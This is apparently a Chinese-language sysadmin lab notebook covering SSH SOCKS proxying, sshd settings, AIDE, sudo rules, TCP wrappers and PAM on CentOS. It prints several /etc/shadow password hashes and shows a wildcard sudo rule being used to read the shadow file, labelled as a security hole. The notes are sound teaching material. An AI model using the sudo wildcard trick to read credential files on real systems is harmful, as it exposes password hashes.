LISTEN      0      128                                         :::9527                                                    :::*                  
LISTEN      0      128                                        ::1:631                                                     :::*                  
LISTEN      0      100                                        ::1:25                                                      :::*                  
LISTEN      0      128                                        ::1:6010                                                    :::*                  
[root@node1 ~]# 

```

## 测试

```
[root@node1 ~]# curl --socks5 127.0.0.1:9527 http://192.168.0.110
www.google.com

```

## 宿主机使用代理访问

```
[root@node3 ~]# iptables -A INPUT -s 192.168.0.101 -p tcp --dport 80 -j REJECT
[root@node3 ~]#  tail -f /var/log/httpd/access_log 


```

配置宿主机浏览器的代理服务器为node1

![image-20201030204323585](C:\Users\localhost\AppData\Roaming\Typora\typora-user-images\image-20201030204323585.png)



## 两台主机做代理

```
[root@node2 ~]# curl 192.168.0.110
www.google.com
[root@node2 ~]# ssh -gD 9527 192.168.0.105 -fN
[root@node2 ~]# ss -tnl
State       Recv-Q Send-Q                           Local Address:Port                                          Peer Address:Port              
LISTEN      0      128                                          *:111                                                      *:*                  
LISTEN      0      5                                192.168.122.1:53                                                       *:*                  
LISTEN      0      128                                          *:22                                                       *:*                  
LISTEN      0      128                                          *:9527                                                     *:*                  
LISTEN      0      128                                  127.0.0.1:631                                                      *:*                  
LISTEN      0      100                                  127.0.0.1:25                                                       *:*                  
LISTEN      0      128                                  127.0.0.1:6010                                                     *:*                  
LISTEN      0      128                                         :::111                                                     :::*                  
LISTEN      0      128                                         :::22                                                      :::*                  
LISTEN      0      128                                         :::9527                                                    :::*                  
LISTEN      0      128                                        ::1:631                                                     :::*                  
LISTEN      0      100                                        ::1:25                                                      :::*                  
LISTEN      0      128                                        ::1:6010                                                    :::*                  
[root@node2 ~]# 
[root@node2 ~]# curl --socks5 192.168.0.105:9527 http://192.168.0.110
www.google.com


```

##  sshd服务器的端口修改

```
[root@node1 ~]# vim /etc/ssh/sshd_config 
                 Port 9527
[root@node1 ~]# 
[root@node1 ~]# 
[root@node1 ~]# 
[root@node1 ~]# systemctl restart sshd
[root@node1 ~]# 
[root@node1 ~]# 
[root@node1 ~]# ss -tnl
State       Recv-Q Send-Q                           Local Address:Port                                          Peer Address:Port              
LISTEN      0      128                                          *:111                                                      *:*                  
LISTEN      0      5                                192.168.122.1:53                                                       *:*                  
LISTEN      0      128                                          *:9527                                                     *:*                  
LISTEN      0      128                                  127.0.0.1:631                                                      *:*                  
LISTEN      0      100                                  127.0.0.1:25                                                       *:*                  
LISTEN      0      128                                  127.0.0.1:6010                                                     *:*                  
LISTEN      0      128                                  127.0.0.1:6011                                                     *:*                  
LISTEN      0      128                                         :::111                                                     :::*                  
LISTEN      0      128                                         :::9527                                                    :::*                  
LISTEN      0      128                                        ::1:631                                                     :::*                  
LISTEN      0      100                                        ::1:25                                                      :::*                  
LISTEN      0      128                                        ::1:6010                                                    :::*                  
LISTEN      0      128                                        ::1:6011                    
```

```
[root@node2 ~]# ssh 192.168.0.107 -p 9527
Last login: Sat Oct 31 09:47:46 2020 from 192.168.0.101
[root@node1 ~]# 
[root@node1 ~]# 

```

## 优化sshd服务

```
GSSAPIAuthentication no 
UseDNS no  不去反向ip地址解析成名称
```

## 各参数的含义

```
man sshd_config
[root@node1 ssh]# grep -vE '^$|#'  /etc/ssh/sshd_config 
Port 22
ListenAddress 192.168.0.107
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
SyslogFacility AUTHPRIV
LoginGraceTime 2m
AuthorizedKeysFile	.ssh/authorized_keys
PasswordAuthentication yes       
ChallengeResponseAuthentication no
GSSAPIAuthentication no
GSSAPICleanupCredentials no
UsePAM yes
X11Forwarding yes
UseDNS no
AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES
AcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT
AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE
AcceptEnv XMODIFIERS
Subsystem	sftp	/usr/libexec/openssh/sftp-server

```

```
ListenAddress 监听的ip地址
SyslogFacility     登录日志文件  /var/log/secure 
PermitRootLogin  是否允许root身份直接登录
#StrictModes yes  检查.ssh/文件的所有者，权限
MaxAuthTries 6    登录验证次数6/2=3次
MaxSessions 10    最多打开10个会话连接
#PubkeyAuthentication yes  指定是否允许公钥身份验证。默认值为“是”。
#PermitEmptyPasswords no   是否支持空字符作为密码
PasswordAuthentication yes  指定是否允许密码身份验证。默认值为“是”。
GatewayPorts no 指定是否允许远程主机连接到为客户端转发的端口
#ClientAliveInterval 0    设置超时间隔
#ClientAliveCountMax 3
UseDNS no  是否已解析主机名
 GSSAPIAuthentication no       指定是否允许基于GSSAPI的用户身份验证。默认值为“否”。
#MaxStartups 10:30:100   未认证连接最大值的，默认值为10
#Banner none  在允许将文件的内容发送到远程用户之前。 /path/file
限制可登录用户的方法：
AllowUsers  shaoxh
DenyUsers wang
AllowGroups
DenyGroups
               



```

dropbear命令

aide

```
[root@node1 ~]# rpm -ql aide
/etc/aide.conf
/etc/logrotate.d/aide
/usr/sbin/aide
/usr/share/doc/aide-0.15.1
/usr/share/doc/aide-0.15.1/AUTHORS
/usr/share/doc/aide-0.15.1/COPYING
/usr/share/doc/aide-0.15.1/ChangeLog
/usr/share/doc/aide-0.15.1/NEWS
/usr/share/doc/aide-0.15.1/README
/usr/share/doc/aide-0.15.1/README.quickstart
/usr/share/doc/aide-0.15.1/contrib
/usr/share/doc/aide-0.15.1/contrib/aide-attributes.sh
/usr/share/doc/aide-0.15.1/contrib/bzip2.sh
/usr/share/doc/aide-0.15.1/contrib/gpg2_check.sh
/usr/share/doc/aide-0.15.1/contrib/gpg2_update.sh
/usr/share/doc/aide-0.15.1/contrib/gpg_check.sh
/usr/share/doc/aide-0.15.1/contrib/gpg_update.sh
/usr/share/doc/aide-0.15.1/contrib/sshaide.sh
/usr/share/doc/aide-0.15.1/manual.html
/usr/share/man/man1/aide.1.gz
/usr/share/man/man5/aide.conf.5.gz
/var/lib/aide
/var/log/aide

```

```
[root@node1 ~]# cp /etc/fstab /data/f1
[root@node1 ~]# cp /etc/passwd /data/f2
[root@node1 ~]# cp /etc/shadow /data/f3

```

## 监控的文件和属性

```
[root@node1 data]# tail -n3 /etc/aide.conf
TEST= p+md5+g+u
/data/ TEST
!/data/f2
[root@node1 data]# 

```

## 生成文件属性样本库

```
[root@node1 data]# aide --init

AIDE, version 0.15.1

### AIDE database at /var/lib/aide/aide.db.new.gz initialized.

[root@node1 data]# ll /var/lib/aide/
total 4
-rw------- 1 root root 235 Oct 31 16:29 aide.db.new.gz

```

## 修改文件属性

```
[root@node1 data]# chmod 600 /data/f1 /data/f2
[root@node1 data]# ll 
total 12
-rw------- 1 root root  477 Oct 31 16:19 f1
-rw------- 1 root root 2123 Oct 31 16:19 f2
---------- 1 root root 1199 Oct 31 16:19 f3
[root@node1 data]# 

```

## 开始比较

```
[root@node1 data]# cd /var/lib/aide/
[root@node1 aide]# mv aide.db.new.gz aide.db.gz
[root@node1 aide]# aide --check
AIDE 0.15.1 found differences between database and filesystem!!
Start timestamp: 2020-10-31 16:32:44

Summary:
  Total number of files:	4
  Added files:			0
  Removed files:		0
  Changed files:		1


---------------------------------------------------
Changed files:
---------------------------------------------------

changed: /data/f1

---------------------------------------------------
Detailed information about changes:
---------------------------------------------------


File: /data/f1
 Perm     : -rw-r--r--                       , -rw-------
[root@node1 aide]# 

```

## 如果恢复属性

```
[root@node1 aide]# chmod 644 /data/f1 
[root@node1 aide]# aide --check

AIDE, version 0.15.1

### All files match AIDE database. Looks okay!

[root@node1 aide]# 

```

## 修改文件内容

```
[root@node1 aide]# echo 1 >> /data/f1
[root@node1 aide]# aide --check
AIDE 0.15.1 found differences between database and filesystem!!
Start timestamp: 2020-10-31 16:35:11

Summary:
  Total number of files:	4
  Added files:			0
  Removed files:		0
  Changed files:		1


---------------------------------------------------
Changed files:
---------------------------------------------------

changed: /data/f1

---------------------------------------------------
Detailed information about changes:
---------------------------------------------------


File: /data/f1
 MD5      : e+QMj523zntS5xV7/VVLZw==         , BxCYh6jn4QbWHvMsSdqwqA==

```

## 保存生效

```
[root@node1 aide]# aide --update
AIDE 0.15.1 found differences between database and filesystem!!
Start timestamp: 2020-10-31 16:36:48

Summary:
  Total number of files:	4
  Added files:			0
  Removed files:		0
  Changed files:		1


---------------------------------------------------
Changed files:
---------------------------------------------------

changed: /data/f1

---------------------------------------------------
Detailed information about changes:
---------------------------------------------------


File: /data/f1
 MD5      : e+QMj523zntS5xV7/VVLZw==         , BxCYh6jn4QbWHvMsSdqwqA==



[root@node1 aide]# 
[root@node1 aide]# cd /var/lib/aide/
[root@node1 aide]# ll
total 8
-rw------- 1 root root 235 Oct 31 16:29 aide.db.gz
-rw------- 1 root root 235 Oct 31 16:36 aide.db.new.gz
[root@node1 aide]# mv aide.db.new.gz aide.db.gz 
mv: overwrite ‘aide.db.gz’? y
[root@node1 aide]# aide --check

AIDE, version 0.15.1

### All files match AIDE database. Looks okay!

[root@node1 aide]# 

```

## sudo



```
[root@node1 ~]# visudo
shaoxh  192.168.0.107=(root) /bin/mount /dev/sr0 /mnt,/bin/umount 
visudo: /etc/sudoers.tmp unchanged
[root@node1 ~]# 
[root@node1 ~]# su - shaoxh
Last login: Sat Oct 31 16:58:36 CST 2020 on pts/0
[shaoxh@node1 ~]$ sudo mount /dev/sr0 /mnt

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for shaoxh: 
mount: /dev/sr0 is write-protected, mounting read-only
[shaoxh@node1 ~]$ ls /mnt/
CentOS_BuildTag  EFI  EULA  GPL  images  isolinux  LiveOS  Packages  repodata  RPM-GPG-KEY-CentOS-7  RPM-GPG-KEY-CentOS-Testing-7  TRANS.TBL
[shaoxh@node1 ~]$ 
[shaoxh@node1 ~]$ sudo umount /mnt
[shaoxh@node1 ~]$ ls /mnt/
[shaoxh@node1 ~]$ 


```

## 把普通用户加入wheel组

```
[root@node1 ~]# useradd wang
[root@node1 ~]# echo wang:shaoxh |chpasswd
[root@node1 ~]# usermod -aG wheel wang
[root@node1 ~]# id wang
uid=1001(wang) gid=1001(wang) groups=1001(wang),10(wheel)
[root@node1 ~]# su - wang
[wang@node1 ~]$ sudo mount /dev/sr0 /mnt

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for wang: 
mount: /dev/sr0 is write-protected, mounting read-only
[wang@node1 ~]$ ls /mnt
CentOS_BuildTag  EFI  EULA  GPL  images  isolinux  LiveOS  Packages  repodata  RPM-GPG-KEY-CentOS-7  RPM-GPG-KEY-CentOS-Testing-7  TRANS.TBL
[wang@node1 ~]$ umount /mnt
umount: /mnt: umount failed: Operation not permitted
[wang@node1 ~]$ sudo umount /mnt
[wang@node1 ~]$ ls /mnt
[wang@node1 ~]$ 

```

## 如果rootID不为0，

```
[root@node1 ~]$ id
uid=2220(root) gid=0(root) groups=0(root)
[root@node1 ~]$ cat /etc/shadow
cat: /etc/shadow: Permission denied
[root@node1 ~]$ sudo -u wang cat /etc/shadow

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for root: 
root:$6$7YEQ0Uq2YMFP6X3n$2X1WsJz2FZIP4VGmLPoycwKfqcQdQvC0S2fUfYPGBJbPNS3gdoTke/bAph12Pb2yrWFXvj1YoQPVlipsXvvcp/::0:99999:7:::
bin:*:17110:0:99999:7:::
daemon:*:17110:0:99999:7:::
adm:*:17110:0:99999:7:::

```

## 额外配置文件

```
#includedir /etc/sudoers.d
[root@node1 ~]# cd /etc/sudoers.d/
[root@node1 sudoers.d]# ls
[root@node1 sudoers.d]# vim txt
[root@node1 sudoers.d]# 
[root@node1 sudoers.d]# cat > txt
magedu ALL=(ALL)  ALL
^C
[root@node1 sudoers.d]# cat txt 
magedu ALL=(ALL)  ALL
[root@node1 sudoers.d]# useradd magedu;echo magedu:shaoxh |chpasswd
[root@node1 sudoers.d]# su - magedu
[magedu@node1 ~]$ mount /dev/sr0 /mnt
mount: only root can do that
[magedu@node1 ~]$ sudo mount /dev/sr0 /mnt

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for magedu: 
mount: /dev/sr0 is write-protected, mounting read-only
[magedu@node1 ~]$ 

```

## 嵌套sudo

```
[root@node1 sudoers.d]# cat txt 
magedu ALL=(ALL)  ALL
niuge  ALL=(magedu) ALL
[root@node1 sudoers.d]# su - niuge
Last login: Sat Oct 31 17:24:49 CST 2020 on pts/0
[niuge@node1 ~]$ sudo -u magedu sudo  cat /etc/shadow
root:$6$7YEQ0Uq2YMFP6X3n$2X1WsJz2FZIP4VGmLPoycwKfqcQdQvC0S2fUfYPGBJbPNS3gdoTke/bAph12Pb2yrWFXvj1YoQPVlipsXvvcp/::0:99999:7:::
bin:*:17110:0:99999:7:::

```

## 普通用户直接修改suduers文件

```
[root@node1 sudoers.d]# cat txt 
magedu ALL=(ALL)  sudoedit
niuge  ALL=       ALL
[root@node1 sudoers.d]# su - magedu
Last login: Sat Oct 31 17:32:00 CST 2020 on pts/0
[magedu@node1 ~]$ sudoedit /etc/sudoers.d/txt
[sudo] password for magedu: 
sudoedit: /etc/sudoers.d/txt unchanged
[magedu@node1 ~]$ sudoedit /etc/sudoers
sudoedit: /etc/sudoers unchanged
[magedu@node1 ~]$ 

```

## 检查语法

```
[root@node1 sudoers.d]# visudo -c
/etc/sudoers: parsed OK
/etc/sudoers.d/txt: bad permissions, should be mode 0440
[root@node1 sudoers.d]# chmod 0440 /etc/sudoers.d/txt 
[root@node1 sudoers.d]# visudo -c
/etc/sudoers: parsed OK
/etc/sudoers.d/txt: parsed OK

```

## 检查单一的文件

```
[root@node1 sudoers.d]# visudo -f /etc/sudoers.d/txt 
visudo: /etc/sudoers.d/txt.tmp unchanged

```

## 利用通配符

```
[root@node1 ~]# cat /etc/sudoers.d/txt
magedu ALL=(ALL)  /bin/cat /var/log/messages*
niuge  ALL=       ALL
[root@node1 ~]# su - magedu
Last login: Sat Oct 31 17:44:24 CST 2020 on pts/0
[magedu@node1 ~]$ cat /var/log/messages 
cat: /var/log/messages: Permission denied
[magedu@node1 ~]$ sudo cat /var/log/messages |head -n 5
Aug 27 21:27:30 node1 journal: Runtime journal is using 8.0M (max allowed 91.1M, trying to leave 136.7M free of 903.6M available → current limit
 91.1M).Aug 27 21:27:30 node1 kernel: Initializing cgroup subsys cpuset
Aug 27 21:27:30 node1 kernel: Initializing cgroup subsys cpu
Aug 27 21:27:30 node1 kernel: Initializing cgroup subsys cpuacct
Aug 27 21:27:30 node1 kernel: Linux version 3.10.0-693.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-16
) (GCC) ) #1 SMP Tue Aug 22 21:09:27 UTC 2017[magedu@node1 ~]$ 

有安全漏洞

[magedu@node1 ~]$ sudo cat /var/log/messages /etc/shadow |tail -n 5
tcpdump:!!:18501::::::
shaoxh:$6$i1BNBK1MMjd.kVzM$pvyQg.0cZxODiD7M/t71tRSTXigVpEXgHtAs/AwEN3ll6eGdQI/mjhdroVkkEAFu9vHo5cDOhehiDhj6yEU/N0::0:99999:7:::
wang:$6$RgoLY/MwIjH/f$meEsmRCRkF/DHNw010pg7tdxZ8ARqlGTCo8FtoJm5YV7fU2Ci1q3szn4Br4bX4jhX4r5x55PTMxlLSF9ZVPsK0:18566:0:99999:7:::
magedu:$6$V/R9kMHzbwY$f4Q6BY85pn5TdjVspj9lOKL1H3ZNHzv0aHO5gohXMYGG4EiAtiah1fQgYP2pajSDfD9QI8V8LnKQ9fOwh9jkq/:18566:0:99999:7:::
niuge:$6$jYEK3/uyd7Z8ana/$GbcuHcaEMVPcSzuC2/rdqMY4suvSdHKWJiu5eRX7.LM6EMSqsDEpVas8brSb3UkjT5L5vr6YXzHBlk5k4kfmE0:18566:0:99999:7:::
[magedu@node1 ~]$ 

```

## 定义别名

```
[root@node1 sudoers.d]# cat txt 
User_Alias DISKADMIN=magedu,wang
Cmnd_Alias DISKCMD=/usr/sbin/fdisk,/usr/sbin/mkfs
DISKAMDIN ALL= DISKCMD

[root@node1 sudoers.d]# su - wang
Last login: Sat Oct 31 17:07:04 CST 2020 on pts/0
[wang@node1 ~]$ sudo fdisk /dev/sda
[sudo] password for wang: 
Welcome to fdisk (util-linux 2.23.2).

Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.


Command (m for help): p


```

## 切换root身份

```
[magedu@node1 ~]$ sudo -i
[root@node1 ~]# 
[root@node1 ~]# 
[root@node1 ~]# id
uid=0(root) gid=0(root) groups=0(root)
[root@node1 ~]# sudo su
[root@node1 ~]# 

```

## TCPWRAPPER

```
[root@node1 ~]# cat /etc/hosts.deny
#
# hosts.deny	This file contains access rules which are used to
#		deny connections to network services that either use
#		the tcp_wrappers library or that have been
#		started through a tcp_wrappers-enabled xinetd.
#
#		The rules in this file can also be set up in
#		/etc/hosts.allow with a 'deny' option instead.
#
#		See 'man 5 hosts_options' and 'man 5 hosts_access'
#		for information on rule syntax.
#		See 'man tcpd' for information on tcp_wrappers
#
sshd: 192.168. EXCEPT 192.168.1.129 EXCEPT 192.168.1.130

拒绝                  允许                       拒绝

sshd：ALL
全拒绝

```

## 拒绝登录用户失败的用户访问

```
[root@node1 ~]# last
last      lastb     lastcomm  lastlog   
[root@node1 ~]# lastb | awk '! /^btmp|^$/{ip[$3]++}END{for (i in ip){if(ip[i]>=3){system("echo sshd:"i">> /etc/hosts.deny")}}}'
[root@node1 ~]# cat /etc/hosts.deny 
#
# hosts.deny	This file contains access rules which are used to
#		deny connections to network services that either use
#		the tcp_wrappers library or that have been
#		started through a tcp_wrappers-enabled xinetd.
#
#		The rules in this file can also be set up in
#		/etc/hosts.allow with a 'deny' option instead.
#
#		See 'man 5 hosts_options' and 'man 5 hosts_access'
#		for information on rule syntax.
#		See 'man tcpd' for information on tcp_wrappers
#
sshd:192.168.1.130
sshd:192.168.1.129

```

## hosts.allow文件配置拒绝

```
[root@node1 ~]# cat /etc/hosts.allow
#
# hosts.allow	This file contains access rules which are used to
#		allow or deny connections to network services that
#		either use the tcp_wrappers library or that have been
#		started through a tcp_wrappers-enabled xinetd.
#
#		See 'man 5 hosts_options' and 'man 5 hosts_access'
#		for information on rule syntax.
#		See 'man tcpd' for information on tcp_wrappers
#
sshd: 192.168.1.129:deny

```

## hosts.deny文件配置接受

```
[root@node1 ~]# cat /etc/hosts.deny 
#
# hosts.deny	This file contains access rules which are used to
#		deny connections to network services that either use
#		the tcp_wrappers library or that have been
#		started through a tcp_wrappers-enabled xinetd.
#
#		The rules in this file can also be set up in
#		/etc/hosts.allow with a 'deny' option instead.
#
#		See 'man 5 hosts_options' and 'man 5 hosts_access'
#		for information on rule syntax.
#		See 'man tcpd' for information on tcp_wrappers
#
sshd: 192.168.1.129:allow

```

## spawn 启动一个外部程序完成执行的操作

```
[root@node1 ~]# cat /etc/hosts.allow 
#
# hosts.allow	This file contains access rules which are used to
#		allow or deny connections to network services that
#		either use the tcp_wrappers library or that have been
#		started through a tcp_wrappers-enabled xinetd.
#
#		See 'man 5 hosts_options' and 'man 5 hosts_access'
#		for information on rule syntax.
#		See 'man tcpd' for information on tcp_wrappers
#
sshd:ALL:spawn echo "$(date +%%F) login attempt from %c to %s,%d" >> /var/log/sshd.log
[root@node1 ~]# cat /var/log/sshd.log 
2020-11-01 login attempt from 192.168.1.129 to sshd@192.168.1.128,sshd
[root@node1 ~]# cat /var/log/sshd.log 
2020-11-01 login attempt from 192.168.1.129 to sshd@192.168.1.128,sshd
2020-11-01 login attempt from 192.168.1.130 to sshd@192.168.1.128,sshd

```

```
[root@node1 ~]# cat /etc/hosts.allow
sshd:192.168.1.129 :twist /bin/echo "connection prohibited"
[root@node1 ~]# 

```

## PAM认证机制

##  pam_shells.so模块

```
[root@node1 pam.d]# vim /etc/pam.d/sshd 
在第一行添加如下
auth       required     pam_shells.so


注释/etc/shells 里的csh
[root@node1 pam.d]# cat /etc/shells
/bin/sh
/bin/bash
/sbin/nologin
/usr/bin/sh
/usr/bin/bash
/usr/sbin/nologin
/bin/tcsh
#/bin/csh


修改普通用户shaoxh的登录shell
[root@node1 pam.d]# chsh -s /bin/bash shaoxh
Changing shell for shaoxh.
Shell changed.
[root@node1 pam.d]# chsh -s /bin/csh shaoxh
Changing shell for shaoxh.
Shell changed.
[root@node1 pam.d]# getent passwd shaoxh
shaoxh:x:1000:1000:shaoxh:/home/shaoxh:/bin/csh

登录测试
[root@node1 pam.d]# ssh shaoxh@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:Z2Ua2Ia89tKhJIy1x5dYw45pF8NDa9HWarhs4m0A+Uk.
ECDSA key fingerprint is MD5:b4:3d:0b:0d:e0:a4:a5:8a:b8:26:c7:6e:bd:a3:80:97.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
shaoxh@127.0.0.1's password: 
Permission denied, please try again.
shaoxh@127.0.0.1's password: 


模块注释可以登录
[root@node1 pam.d]# cat /etc/pam.d/sshd 
#%PAM-1.0
#auth       required     pam_shells.so


[root@node1 pam.d]# ssh shaoxh@127.0.0.1
shaoxh@127.0.0.1's password: 
Last login: Sun Nov  1 11:30:37 2020 from 127.0.0.1
[shaoxh@node1 ~]$ 


```

## 查看哪些服务依赖pam_securetty.so

```
[root@node1 pam.d]# cd /etc/pam.d/
[root@node1 pam.d]# grep pam_securetty.so *
login:auth [user_unknown=ignore success=ok ignore=ignore default=bad] pam_securetty.so
remote:auth       required     pam_securetty.so
[root@node1 pam.d]# cat remote 
#%PAM-1.0
auth       required     pam_securetty.so
auth       substack     password-auth
auth       include      postlogin
account    required     pam_nologin.so
account    include      password-auth
password   include      password-auth
# pam_selinux.so close should be the first session rule
session    required     pam_selinux.so close
session    required     pam_loginuid.so
# pam_selinux.so open should only be followed by sessions to be executed in the user context
session    required     pam_selinux.so open
session    required     pam_namespace.so
session    optional     pam_keyinit.so force revoke
session    include      password-auth
session    include      postlogin
[root@node1 pam.d]# 

```

## 查看安全日志

```
[root@node1 ~]# tail -f /var/log/secure 

```

## 安装启动telnet服务器

```
[root@node1 pam.d]# yum -y install telnet-server telnet;systemctl start telnet.socket

```

## root连接telnet服务器

```
[root@node1 pam.d]# telnet 192.168.1.128
Trying 192.168.1.128...
Connected to 192.168.1.128.
Escape character is '^]'.

Kernel 3.10.0-693.el7.x86_64 on an x86_64
node1 login: root
Password: 
Login incorrect
登录失败
```

## 查看安全日志

```
Nov  1 11:46:43 node1 login: pam_securetty(remote:auth): access denied: tty 'pts/2' is not secure !

/etc/securetty  没有pts/2 终端

解决方法：
[root@node1 pam.d]# echo pts/2 >> /etc/securetty


```

## 重新使用root登录telnet服务器

```
[root@node1 pam.d]# telnet 192.168.1.128
Trying 192.168.1.128...
Connected to 192.168.1.128.
Escape character is '^]'.

Kernel 3.10.0-693.el7.x86_64 on an x86_64
node1 login: root
Password: 
Last failed login: Sun Nov  1 11:46:46 CST 2020 from ::ffff:192.168.1.128 on pts/2
There were 2 failed login attempts since the last successful login.
Last login: Sun Nov  1 11:40:28 from 192.168.1.1
[root@node1 ~]# 

```

## 第二种解决telnet用root登录的方式

```
注释模块
[root@node1 pam.d]# cat /etc/pam.d/remote 
#%PAM-1.0
#auth       required     pam_securetty.so

```

## pam_nologin.so模块

```
[root@node1 pam.d]# grep pam_nologin *
gdm-autologin:account    required    pam_nologin.so
gdm-fingerprint:account     required      pam_nologin.so
gdm-password:account     required      pam_nologin.so
gdm-pin:account     required      pam_nologin.so
gdm-smartcard:account     required      pam_nologin.so
login:account    required     pam_nologin.so
pluto:account required pam_nologin.so
ppp:account    required	pam_nologin.so
remote:account    required     pam_nologin.so
sshd:account    required     pam_nologin.so

创建此文件普通用户不能登录

[root@node1 pam.d]# touch /etc/nologin
[root@node1 pam.d]# ssh shaoxh@192.168.1.128
shaoxh@192.168.1.128's password: 
Authentication failed.
[root@node1 pam.d]# 
[root@node1 pam.d]# su - shaoxh
Last login: Sun Nov  1 12:04:18 CST 2020 on pts/1


```

## 用户维护状态

```
[root@node1 pam.d]# vim su
添加如下内容；要添加account开头的第一行；
account    required     pam_nologin.so

[root@node1 pam.d]# su - shaoxh
deny login

su: Authentication failure
[root@node1 pam.d]# 


```

## pam_limit模块

```
[root@node1 ~]# ab -c 1200 -n 2000 http://www.baidu.com/index.html
This is ApacheBench, Version 2.3 <$Revision: 1430300 $>
Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/

Benchmarking www.baidu.com (be patient)
socket: Too many open files (24)
[root@node1 ~]# 
[root@node1 ~]# 
[root@node1 ~]# ulimit -a
core file size          (blocks, -c) 0
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 7168
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) 7168
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited
[root@node1 ~]# ulimit -n 1500
[root@node1 ~]# ab -c 1200 -n 2000 http://www.baidu.com/index.html

```

```
[root@node1 ~]# cd /etc/pam.d/
[root@node1 pam.d]# grep limit *
fingerprint-auth:session     required      pam_limits.so
fingerprint-auth-ac:session     required      pam_limits.so
password-auth:session     required      pam_limits.so
password-auth-ac:session     required      pam_limits.so
runuser:session		required	pam_limits.so
smartcard-auth:session     required      pam_limits.so
smartcard-auth-ac:session     required      pam_limits.so
sudo:session    required     pam_limits.so
sudo-i:session    required     pam_limits.so
system-auth:session     required      pam_limits.so
system-auth-ac:session     required      pam_limits.so
```

## shaoxh最多能打开5个进程

```
[root@node1 pam.d]# echo "shaoxh   -    nproc   5" >> /etc/security/limits.conf
[root@node1 pam.d]# vim /etc/security/limits.conf 
[root@node1 pam.d]# pgrep -u shaoxh
[root@node1 pam.d]# su - shaoxh 
[shaoxh@node1 ~]$ bash ;bash ;bash
'abrt-cli status' timed out
[shaoxh@node1 ~]$ bash
'abrt-cli status' timed out
[shaoxh@node1 ~]$ bash
bash: fork: retry: No child processes
bash: fork: retry: No child processes
bash: fork: retry: No child processes
bash: fork: retry: No child processes
^C

复制会话连接
[root@node1 ~]# pgrep -u shaoxh 
48454
48505
48542
48578
48635
[root@node1 ~]# 

```

## 每个用户并发登录最多是3次（root在此处不受限制）

```
[root@node1 ~]# tail -1 /etc/security/limits.conf
*        -    maxlogins 3


[root@node1 ~]# 
[root@node1 ~]# who
root     tty3         2020-08-27 22:00
root     pts/0        2020-11-01 16:58 (192.168.1.1)
shaoxh   pts/1        2020-11-01 17:02 (192.168.1.1)
shaoxh   pts/2        2020-11-01 17:02 (192.168.1.1)
shaoxh   pts/3        2020-11-01 17:02 (192.168.1.1)
[root@node1 ~]# 

```

